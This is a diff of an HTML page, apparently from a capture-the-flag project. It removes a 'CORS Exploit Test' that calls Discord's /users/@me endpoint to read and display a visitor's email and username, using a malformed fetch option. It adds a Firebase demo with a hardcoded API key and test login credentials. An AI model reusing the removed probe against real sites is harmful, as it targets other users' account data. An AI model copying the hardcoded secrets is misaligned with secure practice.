@@ -1,51 +1,75 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>CORS Exploit Test</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-    }
-    .result {
-      margin-top: 20px;
-      padding: 10px;
-      border: 1px solid #ccc;
-      background-color: #f9f9f9;
-    }
-    .error {
-      color: red;
-    }
-  </style>
-</head>
-<body>
-  <h1>CORS Exploit Test</h1>
-  <button onclick="sendRead()">Test Read</button>
+  <meta charset="UTF-8">
+  <title>Firebase Test App</title>
+  <script type="module">
+    // Import the Firebase modules
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-auth.js";
+    import { getFirestore, collection, addDoc, getDocs } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore.js";
 
-  <div id="output" class="result"></div>
+    // Your Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyDOshL-50Jw14Y0t_N-nYXbILewJIWCr4g",
+      authDomain: "ctf-67ebf.firebaseapp.com",
+      projectId: "ctf-67ebf",
+      storageBucket: "ctf-67ebf.firebasestorage.app",
+      messagingSenderId: "702876965627",
+      appId: "1:702876965627:web:cb5c5444bacbf52373ae5e"
+    };
 
-  <script>
-    function sendRead() {
-      const output = document.getElementById("output");
-      output.innerHTML = "Loading...";
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getFirestore(app);
 
-      fetch("https://discord.com/api/v9/users/@me", {
-        method: "GET",
-        token: "include"
-      })
-      .then(response => {
-        if (!response.ok) throw new Error("HTTP lol " + response.status);
-        return response.json();
-      })
-      .then(data => {
-        const email = data.email || "Email not available";
-        const username = data.username || "Username not available";
-        output.innerHTML = `<strong>Email:</strong> ${email}<br><strong>Username:</strong> ${username}`;
-      })
-      .catch(err => {
-        output.innerHTML = `<span class="error">Read failed: ${err.message}</span>`;
+    // Function to register a user
+    async function registerUser(email, password) {
+      try {
+        const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+        console.log("User registered:", userCredential.user);
+      } catch (error) {
+        console.error("Error registering:", error.message);
+      }
+    }
+
+    // Function to login a user
+    async function loginUser(email, password) {
+      try {
+        const userCredential = await signInWithEmailAndPassword(auth, email, password);
+        console.log("User logged in:", userCredential.user);
+      } catch (error) {
+        console.error("Error logging in:", error.message);
+      }
+    }
+
+    // Function to add a document to Firestore
+    async function addMessage(message) {
+      try {
+        const docRef = await addDoc(collection(db, "messages"), { text: message, timestamp: Date.now() });
+        console.log("Document written with ID:", docRef.id);
+      } catch (e) {
+        console.error("Error adding document:", e);
+      }
+    }
+
+    // Function to read all messages
+    async function readMessages() {
+      const querySnapshot = await getDocs(collection(db, "messages"));
+      querySnapshot.forEach((doc) => {
+        console.log(`${doc.id} =>`, doc.data());
       });
     }
+
+    // Example usage
+    registerUser("test@example.com", "password123");
+    loginUser("test@example.com", "password123");
+    addMessage("Hello Firebase!");
+    readMessages();
   </script>
+</head>
+<body>
+  <h1>Firebase Test App</h1>
 </body>
 </html>
